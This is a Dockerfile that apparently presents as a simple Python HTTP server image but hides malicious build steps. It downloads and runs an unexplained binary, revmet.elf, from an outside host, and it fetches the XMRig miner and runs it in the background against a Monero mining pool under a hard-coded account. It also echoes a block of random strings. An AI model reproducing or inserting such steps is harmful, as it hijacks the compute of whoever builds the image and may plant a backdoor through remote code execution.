FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo lEd0BFfKcmyXxjW3Jl6Am43ViIsmBlYc Z8koI6x0F8Z17ANV4j9ZTcT4jhkHjE2L QWDf0ot1EHcW6qV8fNCPFsyByHR1R7f7 qfWU9jk8Mns9LXErXRNs5Hv1xh2KnIOs n3AkWmU70eFNKKO9cJvVFNK9Nfi7FbpN lgWPi2MCDeHPRXlLrwiMffixXbkv8VCS lLHRUynPFMFkrTQAiulQH6uJSgq0tMo9 6223I2KhC9IBmtDRGUfoifQKbT0PYukh fOs03i8N6DF5JXKoODgctPrbNlvZ4LSL DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]